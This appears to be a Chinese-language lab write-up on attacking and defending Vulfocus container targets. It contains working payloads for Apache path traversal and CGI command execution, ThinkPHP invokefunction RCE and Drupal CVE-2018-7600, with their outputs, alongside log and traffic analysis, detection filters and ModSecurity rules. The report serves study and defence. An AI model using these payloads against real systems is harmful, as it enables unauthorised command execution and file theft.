- **执行目标**: 直接调用 `sh` shell
- **错误性质**: "End of script output before headers" - 表明shell被执行但没有产生有效的CGI输出头
- **攻击成功**: 尽管有错误，但这实际上表明RCE攻击可能已经成功

5. 安全防护效果评估

**成功的防护**：

- ✅ **路径规范化检查**: 阻止了未编码的路径遍历
- ✅ **文件权限控制**: 阻止了非可执行文件的执行
- ✅ **CGI安全机制**: 限制了恶意CGI执行

**防护绕过**：

- ❌ **编码绕过**: URL编码的路径遍历未被阻止（从访问日志可见）
- ❌ **Shell执行**: 最终成功执行了shell命令

##### 4.2 网络流量捕获与分析

###### 4.2.1 确定容器网络信息

```bash
# 获取 Apache 容器的详细信息
docker inspect a2b4c3a1d377 | grep -A 10 -B 5 "IPAddress"
```

![1748160719557](image/apache靶标/1748160719557.png)
根据容器信息，内部 IP 为 `172.17.0.2`

###### 4.2.2 HTTP流量监控

```bash
# 监听 Docker 网桥上的 HTTP 流量
sudo tcpdump -i docker0 -A -w apache_cve_traffic.pcap 'host 172.17.0.2'
```

在另一个终端执行攻击命令，然后停止抓包：

```bash
# 执行路径遍历攻击
curl "http://10.37.133.3:42286/icons/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

# 执行RCE攻击
curl "http://10.37.133.3:42286/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" -d "echo Content-Type: text/plain; echo; id"
```

![1748160898808](image/apache靶标/1748160898808.png)

![1748160908687](image/apache靶标/1748160908687.png)

###### 4.2.3 流量分析要点

使用 Wireshark 分析捕获的流量：

1. **路径遍历识别**: 查找包含 `%2e%2e`编码的HTTP GET请求
2. **RCE攻击识别**: 寻找向CGI路径发送POST数据的请求
3. **响应分析**: 观察服务器返回的敏感文件内容或命令执行结果
4. **异常模式**: 识别短时间内大量路径遍历尝试的模式

![1748160976060](image/apache靶标/1748160976060.png)

wireshark流量分析

1. 攻击流量概览

**捕获的数据包总数**: 20个数据包
**攻击持续时间**: 约4.2秒
**攻击源**: `10.37.133.3` (Kali攻击机)
**目标**: `172.17.0.2:80` (Apache容器)

2. 第一次攻击连接分析 (数据包1-10)

2.1 TCP连接建立

```
数据包1-3: TCP三次握手
- 数据包1 (0.000000s): SYN - 攻击机发起连接请求
- 数据包2 (0.000030s): SYN+ACK - 服务器响应连接
- 数据包3 (0.000040s): ACK - 连接建立完成
```

**连接特征**:

- **端口映射**: 攻击机端口40722 → 服务器端口80
- **建立时间**: 仅用时40微秒，连接建立非常快速
- **网络延迟**: 极低延迟，说明是本地Docker网络

2.2 RCE攻击载荷

```
数据包4 (0.000105s): HTTP POST请求
- 方法: POST
- 路径: /cgi-bin/..%2e/..%2e/..%2e/..%2e/bin/sh
- 长度: 290字节
- 协议: HTTP
```

**攻击特征分析**:

- **攻击类型**: 远程代码执行(RCE)
- **编码技术**: 使用 `..%2e`混合编码绕过路径检查
- **目标路径**: 通过CGI路径遍历到 `/bin/sh`
- **HTTP方法**: POST - 用于发送命令执行payload
- **载荷大小**: 290字节，包含完整的CGI命令执行数据

2.3 服务器响应

```
数据包5 (0.000125s): TCP ACK - 服务器确认收到请求
数据包6 (0.040140s): HTTP 200 OK响应
- 状态码: 200 OK
- 内容类型: text/plain
- 响应长度: 254字节
- 处理时间: 40毫秒
```

**响应分析**:

- **攻击成功**: HTTP 200状态码表明RCE攻击成功执行
- **响应内容**: text/plain格式，包含命令执行结果
- **处理延迟**: 40毫秒的处理时间，说明服务器执行了shell命令
- **数据大小**: 254字节响应，可能包含 `id`命令的输出结果

2.4 连接关闭

```
数据包7-10: TCP连接关闭
- 数据包8: 攻击机发起FIN+ACK
- 数据包9: 服务器响应FIN+ACK  
- 数据包10: 攻击机确认ACK
```

3. 第二次攻击连接分析 (数据包11-20)

3.1 新连接建立

```
数据包11-13 (4.212s): 第二次TCP三次握手
- 时间间隔: 4.2秒后发起新连接
- 新端口: 40254 → 80
- 建立时间: 18微秒
```

3.2 路径遍历攻击

```
数据包14 (4.212111s): HTTP GET请求
- 方法: GET  
- 路径: /icons/..%2e%2e/..%2e%2e/..%2e%2e/..%2e%2e/etc/passwd
- 长度: 191字节
- 协议: HTTP
```

**攻击特征分析**:

- **攻击类型**: 路径遍历文件读取
- **目标文件**: `/etc/passwd`系统用户文件
- **攻击路径**: 通过 `/icons/`路径进行遍历
- **编码方式**: `..%2e%2e`双重编码绕过检查
- **HTTP方法**: GET - 用于文件读取

3.3 文件读取成功

```
数据包16 (4.212740s): HTTP 200 OK响应
- 状态码: 200 OK
- 响应长度: 1192字节
- 处理时间: 0.6毫秒
```

**响应分析**:

- **攻击成功**: HTTP 200状态码确认文件读取成功
- **文件大小**: 1192字节，与 `/etc/passwd`文件大小一致
- **快速响应**: 0.6毫秒处理时间，说明是直接文件读取
- **数据泄露**: 成功获取了系统用户信息

4. 攻击模式总结

4.1 攻击时序分析

```
时间轴:
0.000s - 0.041s: RCE攻击 (连接1)
4.212s - 4.216s: 文件读取攻击 (连接2)
```

**攻击策略**:

- **分阶段攻击**: 先执行命令获取权限，再读取敏感文件
- **连接复用**: 使用不同TCP连接避免检测
- **时间间隔**: 4秒间隔，可能是手动操作或脚本延迟

4.2 技术特征识别

```
编码技术对比:
- RCE攻击: ..%2e (混合编码)
- 文件读取: ..%2e%2e (双重编码)
```

**绕过技术**:

- **路径多样化**: CGI路径和icons路径分别利用
- **编码变化**: 不同的URL编码方式
- **方法切换**: POST执行命令，GET读取文件

5. 安全检测要点

5.1 流量特征检测

```bash
# 检测路径遍历特征
- URL包含: %2e%2e, ..%2e, ../../../../
- 路径模式: /cgi-bin/.., /icons/..
- 目标文件: /etc/passwd, /bin/sh
```

5.2 异常行为识别

```bash
# 异常响应模式
- CGI路径返回200状态码
- 大量字节的文件读取响应
- 短时间内多次路径遍历尝试
```

5.3 网络监控规则

```bash
# Wireshark过滤规则
http.request.uri contains "%2e%2e" or 
http.request.uri contains "cgi-bin" and http.request.uri contains ".." or
http.request.uri contains "icons" and http.request.uri contains ".."
```

6. 攻击成功指标

**确认攻击成功的关键证据**:

1. ✅ **RCE成功**: POST请求返回200状态码，254字节响应
2. ✅ **文件读取成功**: GET请求返回200状态码，1192字节响应
3. ✅ **权限获取**: 能够执行系统命令和读取敏感文件
4. ✅ **绕过防护**: 成功绕过Apache的路径检查机制


## 内网第三层靶标利用检测

### `vulfocus/thinkphp-cve_2018_1002015:latest` 攻击与利用检测

#### 1. 启动靶机环境

在 Vulfocus 平台中，找到 `vulfocus/thinkphp-cve_2018_1002015:latest` 镜像，点击 "启动"。
根据用户提供的截图，靶机成功启动，Vulfocus 分配的访问地址为 `10.37.133.3:39365`。

![1748019861063](image/第一层两靶标攻击与利用检测/1748019861063.png)

#### 2. 信息收集

通过浏览器访问靶机 `http://10.37.133.3:39365`。
![1748019898037](image/第一层两靶标攻击与利用检测/1748019898037.png)

页面显示: "Welcome BMH shooting range"。这个信息比较通用，没有直接暴露 ThinkPHP 版本号。
`CVE-2018-1002015` 这个 CVE ID 并非广为人知的 ThinkPHP 标准 CVE 编号。但 `vulfocus/thinkphp-cve_2018_1002015` 这个镜像名称暗示它与 2018 年左右的 ThinkPHP 漏洞相关。这通常指向 ThinkPHP 5.x 系列的远程代码执行 (RCE) 漏洞，例如著名的 CVE-2018-20062。我们将基于这类漏洞进行尝试。

#### 3. 漏洞分析与利用

此漏洞源于 ThinkPHP 框架对控制器名称的解析存在缺陷，允许攻击者通过构造特定的 URL 来调用任意类的任意方法，从而导致远程代码执行。

**重要提示：** 在使用 `curl` 执行以下 Payload 时，如果 URL 中包含方括号 `[` 和 `]` (例如 `vars[0]` 或 `vars[1][]`)，直接使用可能会导致 `curl: (3) bad range in URL` 错误。这是因为方括号在 URL 中是特殊字符，需要进行百分号编码。`[` 应编码为 `%5B`，`]` 应编码为 `%5D`。建议将整个 URL 用单引号 `'` 包裹，以避免 shell 对特殊字符 (如 `&`, `\`) 的额外转义。

* **Payload 1: 执行 `phpinfo()` (验证漏洞存在性)**
  构造如下 URL (已进行方括号编码)：
  `http://10.37.133.3:39365/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars%5B0%5D=phpinfo&vars%5B1%5D%5B%5D=1`
  使用 `curl` 或浏览器访问：

  ```bash
  curl 'http://10.37.133.3:39365/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars%5B0%5D=phpinfo&vars%5B1%5D%5B%5D=1'
  ```

  ![1748020421170](image/第一层两靶标攻击与利用检测/1748020421170.png)
  如图,响应中包含 PHP 的配置信息（`phpinfo()` 的输出），则表明漏洞存在且可利用。
* **Payload 2: 执行系统命令 (例如 `id`)**
  构造 URL 以执行 `id` 命令 (已进行方括号编码)：
  `http://10.37.133.3:39365/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars%5B0%5D=system&vars%5B1%5D%5B%5D=id`
  使用 `curl` 执行：

  ```bash
  curl 'http://10.37.133.3:39365/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars%5B0%5D=system&vars%5B1%5D%5B%5D=id'
  ```

  如图,响应中包含类似 `uid=0(root) gid=0(root) groups=0(root)` 的输出，表示命令成功执行
  ![1748020916102](image/第一层两靶标攻击与利用检测/1748020916102.png)
* **Payload 3: 获取 Flag**
  假设 flag 文件位于 `/flag.txt` 或 `/flag`。
  构造 URL (已进行方括号编码) 尝试读取 `/flag.txt`：
  `http://10.37.133.3:39365/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars%5B0%5D=system&vars%5B1%5D%5B%5D=cat%20/flag.txt`
  或者尝试读取 `/flag`：
  `http://10.37.133.3:39365/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars%5B0%5D=system&vars%5B1%5D%5B%5D=cat%20/flag`
  使用 `curl` 获取：

  ```bash
  # 尝试读取 /flag.txt
  curl 'http://10.37.133.3:39365/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars%5B0%5D=system&vars%5B1%5D%5B%5D=cat%20/flag.txt'
  # 或者尝试读取 /flag
  curl 'http://10.37.133.3:![1748067441252](image/第一层两靶标攻击与利用检测/1748067441252.png)39365/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars%5B0%5D=system&vars%5B1%5D%5B%5D=cat%20/flag'
  ```

  ![1748021243075](image/第一层两靶标攻击与利用检测/1748021243075.png)

  尝试 cat /flag.txt 和 cat /flag 都没有返回任何输出，这意味着 flag 文件可能不在这些预期的路径下，或者文件名不同，或者我们执行命令的用户（通过 id 命令可以看到，通常是 www-data 或类似权限较低的用户）没有权限读取这些文件。

1. 尝试列出根目录文件和目录：

```bash
    curl 'http://10.37.133.3:39365/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars%5B0%5D=system&vars%5B1%5D%5B%5D=ls%20-la%20/'
```

![1748021233259](image/第一层两靶标攻击与利用检测/1748021233259.png)

这里直接看并没有明显叫做 "flag" 或类似的文件。app 和 var 目录是常见的Web应用相关目录，但根目录下没有直接的 flag 文件

2. 搜索名为 "flag" (不区分大小写) 的文件：
   我们可以使用 find 命令在整个文件系统中搜索包含 "flag" 字符串的文件名。这可能会产生很多输出，但 flag 可能就在其中。
   find / -name '*flag*' (搜索文件名中包含 "flag" 的文件，不区分大小写可以使用 -iname)
   考虑到输出可能很长，直接在 curl 中显示可能不方便，但我们可以先尝试。
   需要对 find 命令中的 / 和 * 进行 URL 编码：/ 编码为 %2F，* 编码为 %2A。

```bash
    curl 'http://10.37.133.3:39365/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars%5B0%5D=system&vars%5B1%5D%5B%5D=find%20%2F%20-name%20%27%2Aflag%2A%27'
```

![1748021332621](image/第一层两靶标攻击与利用检测/1748021332621.png)

find 命令成功执行,找到了flag!

 `flag-{bmh8b59ed0c-3042-499e-9a2d-ef93c0e1ec87}`

 ![1748023336097](image/第一层两靶标攻击与利用检测/1748023336097.png)

#### 4. 威胁检测

##### 4.1 查看 Web 服务器访问日志:

  首先确定 `thinkphp-cve_2018_1002015` 容器的 ID 或名称：

```bash
  docker ps
```

![1748021570040](image/第一层两靶标攻击与利用检测/1748021570040.png)

  得到容器ID 为 `c097683c73a4`。
  进入容器内部：

```bash
  docker exec -it c097683c73a4 /bin/bash
```

![1748021853513](image/第一层两靶标攻击与利用检测/1748021853513.png)
这个错误 OCI runtime exec failed: exec failed: unable to start container process: exec: "/bin/bash": stat /bin/bash: no such file or directory: unknown 表明在容器 c097683c73a4 内部，/bin/bash 这个路径是无效的，也就是说该容器中没有安装 bash shell，或者它不在 /bin/bash 这个位置。

这通常发生在一些极简的 Docker 镜像中，它们为了减小体积可能只包含了最基础的 shell，如 /bin/sh (Bourne Shell)，或者甚至没有一个标准的交互式 shell。

解决方案：尝试使用 /bin/sh

```bash
  docker exec -it c097683c73a4 /bin/sh
```

![1748021885646](image/第一层两靶标攻击与利用检测/1748021885646.png)
成功进入

    2.**定位 ThinkPHP 日志目录**:
        ThinkPHP 的日志通常位于 `/app/runtime/log/` (如果应用部署在 `/app` 目录)。
        根据之前的探索，日志按年月分子目录，例如 `runtime/log/YYYYMM/DD.log`。

```bash
# 在容器内执行   
ls -la /app/runtime/log/
```

![1748022328861](image/第一层两靶标攻击与利用检测/1748022328861.png)

在 `202505` 目录下，找到以日期命名的 `.log` 文件: `24.log`

![1748022443415](image/第一层两靶标攻击与利用检测/1748022443415.png)

    3.**查看日志内容**:

```bash
# 日志文件为 /app/runtime/log/202505/24.log   
cat /app/runtime/log/202505/24.log   
# 或者使用 tail 查看最新的日志   
tail -f /app/runtime/log/202505/24.log
```

![1748022479245](image/第一层两靶标攻击与利用检测/1748022479245.png)

```bash
/app/runtime/log/202505 #         cat /app/runtime/log/202505/24.log
---------------------------------------------------------------
[ 2025-05-24T01:12:36+08:00 ] 10.37.133.2 GET 10.37.133.3:39365/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
[ error ] [0]variable type error： boolean
---------------------------------------------------------------
[ 2025-05-24T01:13:19+08:00 ] 10.37.133.2 GET 10.37.133.3:39365/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
[ error ] [0]variable type error： boolean
---------------------------------------------------------------
[ 2025-05-24T01:14:24+08:00 ] 10.37.133.3 GET 10.37.133.3:39365/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars%5B0%5D=phpinfo&vars%5B1%5D%5B%5D=1
[ error ] [0]variable type error： boolean
```

**日志分析**：

* **请求详情**：日志中清晰可见多个针对 `index.php` 的 GET 请求，它们都利用了 ThinkPHP RCE 漏洞的特征 (`s=index/\think\app/invokefunction`, `function=call_user_func_array`, `vars[0]=phpinfo`) 来尝试执行 `phpinfo()` 函数。
* **错误信息**：每个成功的 `phpinfo()` 调用请求后都记录了 `[ error ] [0]variable type error： boolean`。这表明尽管 `phpinfo()` 成功执行（如实验前面步骤所示，输出了PHP信息），但 ThinkPHP 的日志系统在处理 `phpinfo()` 函数的返回值 (通常是 `true`) 时遇到了类型不匹配的问题，因此记录了此错误。这个错误并不代表漏洞利用失败，而是框架内部处理流程的一个表现。
* **攻击溯源**：日志记录了攻击发生的时间（例如 `2025-05-24T01:12:36+08:00`）和请求的源 IP 地址（例如 `10.37.133.2`, `10.37.133.3`），这些信息对于追踪攻击来源至关重要。

如果执行其他命令（如 `system` 调用 `id` 或 `cat`），其请求也会被类似地记录下来，但其执行结果（如 `id` 的输出或 flag 内容）主要通过 HTTP 响应直接返回给攻击者，不一定会详细记录在 ThinkPHP 的应用层日志中，除非配置了特定的日志级别或命令执行本身触发了 PHP 错误。

##### 4.3 网络流量捕获:

与靶标一类似，我们需要监听 Docker 的网桥接口 (`docker0`) 以及靶标二容器在该网络中的内部 IP 和实际服务端口。

1. **确定容器内部 IP**:
   使用 `docker inspect c097683c73a4`查看容器网络详情。

   ```json
   // docker inspect c097683c73a4 输出片段
   {
       "Id": "c097683c73a4f9c0e4ab736db3880a3d0da11c2e73a1e2af23d439ce10478271",
       // ... (其他字段已省略)
       "Config": {
           // ...
           "ExposedPorts": {
               "80/tcp": {}
           },
           // ...
       },
       "NetworkSettings": {
           // ...
           "Ports": {
               "80/tcp": [
                   {
                       "HostIp": "0.0.0.0",
                       "HostPort": "39365"
                   },
                   {
                       "HostIp": "::",
                       "HostPort": "39365"
                   }
               ]
           },
           // ...
           "IPAddress": "172.17.0.2", // 容器在默认 bridge 网络上的 IP
           // ...
           "Networks": {
               "bridge": {
                   // ...
                   "IPAddress": "172.17.0.2",
                   "Gateway": "172.17.0.1",
                   // ...
               }
           }
       }
   }
   ```

   根据输出，容器 `c097683c73a4` 在 `bridge` 网络（通常对应 `docker0` 接口）下的 `IPAddress` 为 `172.17.0.2`，其内部服务端口为 `80` (外部映射到 `39365`)。
   ![1748022767146](image/第一层两靶标攻击与利用检测/1748022767146.png)

2.**执行 `tcpdump` 命令**:

```bash
# 容器内部 IP 为 172.17.0.2，容器内服务端口为 80   
sudo tcpdump -i docker0 -A 'host 172.17.0.2 and port 80' -w thinkphp_traffic.pcap
```

在 `tcpdump` 运行时，重新执行之前的 `curl` 攻击 Payload，获取 Flag 的 Payload：

```bash
curl 'http://10.37.133.3:39365/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars%5B0%5D=system&vars%5B1%5D%5B%5D=cat%20/tmp/flag-%7Bbmh8b59ed0c-3042-499e-9a2d-ef93c0e1ec87%7D'
```

  ![1748023040614](image/第一层两靶标攻击与利用检测/1748023040614.png)

3.**停止抓包并分析**:
    按 `Ctrl+C` 停止 `tcpdump`。使用 Wireshark 打开 `thinkphp_traffic.pcap` 文件。
    筛选 `http` 流量，查看包含恶意 Payload 的 HTTP GET 请求，分析请求路径、参数以及服务器的响应

  ![1748023079982](image/第一层两靶标攻击与利用检测/1748023079982.png)

  ![1748023099838](image/第一层两靶标攻击与利用检测/1748023099838.png)

分析:
    1.  **TCP 连接建立 (数据包 1-3)**: 攻击机 (`10.37.133.3`) 与靶标容器 (`172.17.0.2`) 在端口 `80` 上成功完成了 TCP 三次握手。
    2.  **恶意 HTTP 请求 (数据包 4)**: 攻击机发送了一个 HTTP GET 请求，其 URL 包含了用于触发 ThinkPHP RCE 漏洞并执行 `cat /tmp/flag-{...}` 命令的恶意 Payload。
    3.  **服务器响应与数据回传 (数据包 6, 8)**: 服务器返回 `HTTP/1.1 200 OK` 响应，表明请求被成功处理。关键的命令执行结果 (flag 内容) 包含在数据包 6 (TCP Push) 中并回传给了攻击机
    4.  **TCP 连接关闭 (数据包 9-10 及之后)**: 攻击机发起 TCP 连接的关闭流程。

这些捕获到的数据包有力地证明了攻击者通过构造恶意的HTTP GET请求将 ls /tmp 命令传递给了目标服务器，并成功执行。


# 入口漏洞缓解
## 方法一
### Drupal CVE-2018-7600 漏洞分析

### 漏洞概述

CVE-2018-7600，也被称为"Drupalgeddon 2"，是Drupal内容管理系统中的一个严重远程代码执行漏洞。该漏洞于2018年3月28日披露，影响Drupal 6、7和8版本。

### 漏洞细节

#### 漏洞类型
- 远程代码执行(RCE)
- 影响Drupal核心的渲染系统

#### 受影响版本
低于 7.58 的 Drupal、低于 8.3.9 的 8.x 版本、低于 8.4.6 的 8.4.x 版本以及低于 8.5.1 的 8.5.x 版本允许远程攻击者执行任意代码，因为存在影响具有默认或通用模块配置的多个子系统的问题。

#### 漏洞根源

该漏洞源于Drupal表单API在处理表单渲染时的缺陷。攻击者可以通过精心构造的请求，在表单渲染过程中注入恶意代码，绕过系统的安全限制，最终导致任意PHP代码执行。

### 漏洞利用原理

1. **表单API处理流程**：Drupal的表单系统在处理用户输入时，会经历构建、验证、提交和渲染等阶段。

2. **不安全渲染**：在渲染阶段，系统会递归处理表单元素及其子元素，但没有充分过滤用户提供的数组键名。

3. **注入点**：攻击者可以通过控制表单元素的`#`前缀属性(如`#markup`、`#access_callback`等)来注入恶意代码。

4. **代码执行**：通过注入PHP函数(如`passthru`、`system`等)，攻击者可以执行任意命令。

### 漏洞利用示例

一个典型的利用请求可能如下所示：

```
POST /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=passthru&mail[#type]=markup&mail[#markup]=id
```

这个请求会利用Drupal的AJAX表单处理机制，通过`#post_render`回调执行系统命令。

## 漏洞重要性

CVE-2018-7600被评为"高危"漏洞(CVSS评分9.8)，因为：
- 无需认证即可利用
- 可导致完全系统接管
- 利用代码公开后很快出现自动化攻击工具


## 漏洞利用

对入口靶标进行攻击：
启动容器 vulfocus/drupal-cve_2018_7600 ，打开网页以后进行抓包，发送
```
POST /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1
Host: 192.168.56.119:37124
Content-Type: application/x-www-form-urlencoded
Content-Length: 103

form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id
```
得到回复：
```
HTTP/1.1 200 OK
Date: Wed, 21 May 2025 05:26:04 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.19
Cache-Control: must-revalidate, no-cache, private
X-UA-Compatible: IE=edge
Content-language: en
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Expires: Sun, 19 Nov 1978 05:00:00 GMT
X-Generator: Drupal 8 (https://www.drupal.org)
X-Drupal-Ajax-Token: 1
Content-Length: 209
Content-Type: application/json

[{"command":"insert","method":"replaceWith","selector":null,"data":"uid=33(www-data) gid=33(www-data) groups=33(www-data)\u003Cspan class=\u0022ajax-new-content\u0022\u003E\u003C\/span\u003E","settings":null}]
```
返回结果中包含www-data用户权限信息，证明命令执行成功
![](img/利用得到回复.png)

## 漏洞缓解

禁用用户注册和危险路由

### 编辑Drupal的settings.php文件
```
nano /var/www/html/sites/default/settings.php
```
在文件末尾添加以下内容：

```php
// 禁用用户注册
$config['user.settings']['register'] = 'admin_only';
// 关闭AJAX表单漏洞入口
$config['system.performance']['fast_404']['exclude_ajax_paths'] = TRUE;
```
以此来拦截恶意请求特征（如 `element_parents` 参数）。
![](img/添加config.png)

### 重启Web服务：

Apache
```
sudo systemctl restart apache2
```
再次发送前面的请求，
得到响应：
```
HTTP/1.1 403 Forbidden
Date: Wed, 21 May 2025 06:17:02 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.19
Cache-Control: must-revalidate, no-cache, private
X-UA-Compatible: IE=edge
Content-language: en
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Expires: Sun, 19 Nov 1978 05:00:00 GMT
X-Generator: Drupal 8 (https://www.drupal.org)
Content-Length: 2
Content-Type: application/json

{}
```

![](img/缓解结果.png)
可以看到，漏洞得到了缓解。
添加的防护措施（`settings.php` 修改 + Apache 规则）已成功拦截攻击请求，Drupal 不再处理包含恶意参数（如 `element_parents`、`ajax_form`）的请求，返回空 JSON `{}` 和 403 状态码。
并且登录网页可以看到界面发生了变化：
![](img/原先界面.png)
![](img/现在界面.png)



## 方法二：打造Web应用防火墙（WAF）来缓解 Wordpress 漏洞

### 实验目标
搭建并配置 ModSecurity Web 应用防火墙（WAF），以防御 Wordpress 漏洞攻击。通过实验，掌握以下内容：
1. ModSecurity 的安装与配置。
2. OWASP 核心规则集（CRS）的使用。
3. 针对 Wordpress 漏洞的自定义规则配置。
4. 通过反向代理测试 WAF 的拦截效果。
5. 解决实验过程中遇到的常见问题。

---

### 实验环境
- 操作系统：Kali Linux
- 工具：Apache2、ModSecurity、OWASP CRS、Docker、Wireshark
- 漏洞环境：Wordpress 漏洞测试环境（运行在 23509 端口）

---

### 实验流程

#### 1. 安装ModSecurity
ModSecurity 是一个开源的 Web 应用防火墙（WAF）模块，支持 Apache、Nginx 等 Web 服务器。它通过检测和拦截恶意请求来保护 Web 应用程序。

##### 安装Apache和ModSecurity
```bash
sudo apt update
sudo apt install apache2 libapache2-mod-security2
```
- apache2 是 Apache HTTP 服务器。
- libapache2-mod-security2 是 ModSecurity 的 Apache 模块。
![1748183239288](image/readme/1748183239288.png)

##### 配置ModSecurity
1. 备份默认配置文件：
   ```bash
   sudo cp /etc/modsecurity/modsecurity.conf-recommended /etc/modsecurity/modsecurity.conf
   ```
   ![1748183212133](image/readme/1748183212133.png)
   - 默认情况下，ModSecurity 提供了一个推荐的配置文件 modsecurity.conf-recommended。
   - 复制该文件为 modsecurity.conf，以便进行自定义配置。
2. 编辑配置文件：
   ```bash
   sudo vim /etc/modsecurity/modsecurity.conf
   ```
   将`SecRuleEngine`设置为`On`：
   ```bash
   SecRuleEngine On
   ```
   SecRuleEngine 控制 ModSecurity 的规则引擎状态,有以下三种状态:
   - Off：完全禁用规则引擎。
   - DetectionOnly：启用规则引擎，但仅用于检测，不会拦截恶意请求。
   - On：启用规则引擎，检测并拦截恶意请求。
   ![1748183252358](image/readme/1748183252358.png)

3. 重启Apache：
   ```bash
   sudo systemctl restart apache2
   ```
   Apache 在启动时会加载 ModSecurity 模块及其配置文件。
   ![1748183263888](image/readme/1748183263888.png)

#### 3. 使用OWASP核心规则集（CRS）
OWASP CRS提供了一套规则，用于防御常见Web攻击。

##### 下载OWASP CRS
```bash
sudo apt install modsecurity-crs
```
OWASP CRS 是一组预定义的规则，覆盖了多种 Web 攻击类型。
![1748183274617](image/readme/1748183274617.png)

##### 配置OWASP CRS
1. 将规则集链接到ModSecurity：
   ```bash
   sudo ln -s /usr/share/modsecurity-crs/ /etc/apache2/modsecurity-crs
   ```
    ![1748183286516](image/readme/1748183286516.png)
   - 创建符号链接是为了让 ModSecurity 能够方便地访问和加载 OWASP CRS 提供的规则文件。
2. 在ModSecurity配置中加载规则集：
   ```bash
   sudo vim /etc/apache2/mods-enabled/security2.conf
   ```
   添加以下内容：
   ```bash
   IncludeOptional /etc/apache2/modsecurity-crs/*.conf
   IncludeOptional /etc/apache2/modsecurity-crs/rules/*.conf
   ```
   这样配置后,IncludeOptional 指令告诉 Apache 加载指定路径下的所有 .conf 文件。加载 /etc/apache2/modsecurity-crs/ 目录下的所有主配置文件。加载该目录下 rules/ 子目录中的所有规则文件
   ![1748183294205](image/readme/1748183294205.png)

3. 重启Apache：
   ```bash
   sudo systemctl restart apache2
   ```
   ModSecurity 会在每次请求时应用这些规则，检测并拦截恶意流量。

#### 4. 自定义 Wordpress 漏洞规则配置
为了防御 Wordpress 漏洞攻击，我们需要添加针对其原理的自定义规则。

##### 添加自定义规则
1. 创建自定义规则文件：
   ```bash
   sudo vim /etc/apache2/modsecurity-crs/rules/REQUEST-900-Wordpress.conf
   ```

2. 添加以下规则：
   ```
   # 拦截尝试修改角色的请求
   SecRule REQUEST_URI "@contains /wp-json/buddypress/v1/members/me" \
      "id:1001,\
      phase:2,\
      block,\
      msg:'BuddyPress 权限提升尝试',\
      chain"
      SecRule REQUEST_METHOD "@streq POST" \
         "chain"
         SecRule REQUEST_BODY "@rx \"roles\"\s*:\s*\"administrator\"" \
               "t:none,t:urlDecode,t:htmlEntityDecode"

   # 拦截异常的激活请求
   SecRule REQUEST_URI "@rx /wp-json/buddypress/v1/signup/activate/[^/]+$" \
      "id:1002,\
      phase:2,\
      block,\
      msg:'可疑的BuddyPress账户激活尝试'"
   ```
   🔹**第一条规则：拦截尝试修改角色的请求（权限提升）**
      | 参数名称 | 值/表达式 | 说明 |
      |----------|------------|------|
      | `SecRule` | - | 定义一条 ModSecurity 规则 |
      | `REQUEST_URI` | `@contains /wp-json/buddypress/v1/members/me` | 匹配请求 URI 中是否包含特定路径（即目标接口） |
      | `id` | `1001` | 规则唯一标识符，便于日志追踪和管理 |
      | `phase` | `2` | 在请求处理阶段 2（请求头和请求体已解析）执行此规则 |
      | `block` | - | 如果匹配成功，则阻止请求并返回 403 Forbidden |
      | `msg` | `'BuddyPress 权限提升尝试'` | 当规则触发时记录的日志信息 |
      | `chain` | - | 表示该规则与下一条规则形成“链式”匹配关系，必须同时满足所有条件才会触发动作 |

      - 作用：
         1. 检测请求是否访问了 `/wp-json/buddypress/v1/members/me` 接口；
         2. 判断请求方法是否为 `POST`；
         3. 检查请求体中是否包含 `"roles": "administrator"`；
         4. 如果全部条件都满足，ModSecurity 将阻断请求，并记录日志。


   🔹**第二条规则：拦截异常的激活请求（注册绕过）**

   ```apache
   SecRule REQUEST_URI "@rx /wp-json/buddypress/v1/signup/activate/[^/]+$" \
      "id:1002,\
      phase:2,\
      block,\
      msg:'可疑的BuddyPress账户激活尝试'"
   ```

   | 参数名称 | 值/表达式 | 说明 |
   |----------|------------|------|
   | `SecRule` | - | 定义一条 ModSecurity 规则 |
   | `REQUEST_URI` | `@rx /wp-json/buddypress/v1/signup/activate/[^/]+$` | 使用正则表达式匹配请求 URI 是否符合 `/wp-json/buddypress/v1/signup/activate/<activation_key>` 的格式 |
   | `id` | `1002` | 规则唯一标识符 |
   | `phase` | `2` | 在请求处理阶段 2 执行此规则 |
   | `block` | - | 如果匹配成功，则阻止请求并返回 403 Forbidden |
   | `msg` | `'可疑的BuddyPress账户激活尝试'` | 当规则触发时记录的日志信息 |

   - 作用：
      1. 检测请求是否访问了 BuddyPress 的激活接口；
      2. 判断 URL 中是否包含一个随机生成的激活密钥（如 `v6EeK8XWihRsxXvXAWPMVzSTO2gs7WdF`）；
      3. 如果匹配成功，ModSecurity 将阻断请求并记录日志。

| 攻击行为 | 对应规则 | 功能 |
|----------|-----------|------|
| 提权（将普通用户变为管理员） | 第一条规则 | 拦截 `/wp-json/buddypress/v1/members/me` 的 POST 请求中包含 `"roles": "administrator"` 的情况 |
